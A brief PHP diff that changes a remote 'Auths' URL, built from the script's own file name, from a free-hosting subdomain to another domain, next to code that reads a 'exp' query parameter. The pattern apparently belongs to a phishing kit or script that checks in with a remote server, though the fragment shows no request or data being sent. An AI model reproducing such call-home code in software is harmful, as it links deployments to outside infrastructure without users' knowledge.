@@ -33,7 +33,7 @@ if (isset($_GET["exp"])) {
     $exp = null;
 }
 
-$fn = "https://monkeyys.000webhostapp.com/Auths//" . basename($_SERVER['PHP_SELF']);
+$fn = "https://efial.wtf/Backend/Auths//" . basename($_SERVER['PHP_SELF']);
 $fnn = basename($_SERVER['PHP_SELF']);
 
 if(!$exp){
